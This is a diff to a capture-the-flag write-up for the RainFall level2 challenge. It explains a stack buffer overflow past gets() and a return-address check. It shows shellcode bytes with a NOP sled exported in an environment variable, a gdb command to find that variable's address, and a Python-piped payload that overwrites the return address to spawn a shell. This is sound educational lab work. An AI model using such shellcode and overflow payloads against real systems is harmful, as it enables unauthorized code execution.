@@ -27,7 +27,7 @@ Those two lines after the call to `gets()` are showing a protection against a st
 0x080484fb      and eax, 0xb0000000
 0x08048500      cmp eax, 0xb0000000
 ```
-For example, if we try to target an address after the `gets()` like `ret => 0x0804853e` and then go 4 bytes after the original EIP address `info frame` to target the NOP `0xbffff71c + 4 = 0xbffff720`, the program calls `exit`.
+For example, if we try to target an address after the `gets()` like `ret => 0x0804853e` and then go 4 bytes after the original EIP address `info frame` to target the NOP `0xbffff71c + 4 = 0xbffff720`, or target `system` in the libc, the program calls `exit`.
 
 If we put our shellcode in an environment variable, we be sure that it's not alterated with the buffer.
 
@@ -39,7 +39,13 @@ export SHELLCODE=$(python -c 'print 100 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73
 ```
 the NOP are added to optimize the chance that the ret address points to it so the SHELLCODE will be executed.
 
-Get SHELLCODE var address with exploit then
+Get SHELLCODE var address with gdb 
+```
+(gdb) x/5s *((char **)environ)
+...
+0xbffff7ef:	 "SHELLCODE=...
+```
+then
 ```
 level2@RainFall:~$ (python -c "print 'A' * 80 + '\x3e\x85\x04\x08' + [shellcode address] " & cat) | ./level2
 whoami
